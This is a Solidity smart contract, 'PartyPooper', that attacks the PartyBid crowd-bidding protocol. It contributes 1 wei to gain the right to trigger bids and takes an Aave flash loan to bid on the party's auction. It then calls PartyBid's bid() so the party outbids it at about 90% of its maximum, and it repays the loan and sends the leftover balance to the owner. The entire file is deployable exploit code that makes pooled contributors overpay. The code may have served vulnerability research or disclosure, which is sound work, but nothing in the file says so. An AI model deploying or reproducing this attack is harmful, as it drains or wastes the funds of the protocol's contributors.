//SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.12;

import {IPartyBid} from "./interfaces/IPartyBid.sol";
import {IMarketWrapper} from "./interfaces/IMarketWrapper.sol";
import {IWETH} from "./interfaces/IWETH.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {FlashLoanReceiverBase} from "@aave/protocol-v2/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import {ILendingPoolAddressesProvider} from "@aave/protocol-v2/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import {ILendingPool} from "@aave/protocol-v2/contracts/interfaces/ILendingPool.sol";

//partypooper contract can be used to trigger a maxbid from partybid
contract PartyPooper is Ownable, FlashLoanReceiverBase {

    address internal immutable partyBid;
    uint8 internal constant FEE_PERCENT = 5;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor(address _partyBid, 
                ILendingPoolAddressesProvider _addressProvider) 
                FlashLoanReceiverBase(_addressProvider) public payable {
        require(_partyBid != address(0), "!_partyBid");
        partyBid = _partyBid;
        //contribue 1 wei to gain ability to trigger bids
        IPartyBid(_partyBid).contribute{value: 1}();
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        override
        returns (bool)
    {
        //bid amount that should be equal to amount loaned
        uint256 flashLoanBidAmount = amounts[0];
        require(flashLoanBidAmount > getMinAuctionBind(), "bid below required min!");

        uint256 auctionId = IPartyBid(partyBid).auctionId();
        //unwrap weth
        IWETH(WETH).withdraw(flashLoanBidAmount);

        //submit bid
        (bool success, bytes memory returnData) = IPartyBid(partyBid).marketWrapper().delegatecall(
                abi.encodeWithSignature("bid(uint256,uint256)", auctionId, flashLoanBidAmount));
        
        require(success, string(abi.encodePacked("PartyBid::bid: place bid failed: ", returnData)));

        // trigger partybid bid which should be above last bid
        IPartyBid(partyBid).bid();

        // approvals to return flashloan funds
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i].add(premiums[i]);

            IWETH(WETH).deposit{value:amountOwing}();
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }
        
        return true;
    }

    function triggerFlashLoanAndExecuteBids(uint256 flashLoanBidAmount) public {
        address receiverAddress = address(this);

        address[] memory assets = new address[](1);
        assets[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanBidAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        address onBehalfOf = address(this);
        // abi.encode(flashLoanBidAmount);
        bytes memory params = "";
        uint16 referralCode = 0;

        LENDING_POOL.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    function raisePartyBid() external payable onlyOwner {
        uint256 flashLoanBidAmount = getFlashLoadBidAmount();
        triggerFlashLoanAndExecuteBids(flashLoanBidAmount);
        payable(owner()).transfer(address(this).balance);
    }

    // a temporary hack to calculate the amount that needs to be borrowed from 
    // flash loan to bid on auction. We want this amount to be large enough that 
    //the subsequent bid from partybid is close to partybid's max bid. But not so large 
    //that the subsequent auction's minBid is larger than partybid's max bid. Because min bid logic 
    //is both platform dependent and auction dependent, deriving the optimal value
    //will require some effort. 
    function getFlashLoadBidAmount() internal view returns (uint256) {
        uint256 totalContributedToParty = IPartyBid(partyBid).totalContributedToParty();
        uint256 maximumPossiblePartyBid = _getMaximumBid(totalContributedToParty);
        //for now, we make it 90% of partybid's max possible bid
        return (maximumPossiblePartyBid * 90) / 100;
    }

    //replicate max bid logic from partybid contract
    //this is the maximum bid that partybid is able to submit
    function _getMaximumBid(uint256 totalContributedToParty) internal pure returns (uint256) {
        return totalContributedToParty - _getFee(totalContributedToParty);
    }

    //partyDAO currently takes a 5% fee
    function _getFee(uint256 _amount) internal pure returns (uint256) {
        return (_amount * FEE_PERCENT) / 100;
    }

    function getMinAuctionBind() internal view returns (uint256) {
        address marketWrapper = IPartyBid(partyBid).marketWrapper();
        uint256 auctionId = IPartyBid(partyBid).auctionId();
        return IMarketWrapper(marketWrapper).getMinimumBid(auctionId);
    } 

    receive() external payable {}
}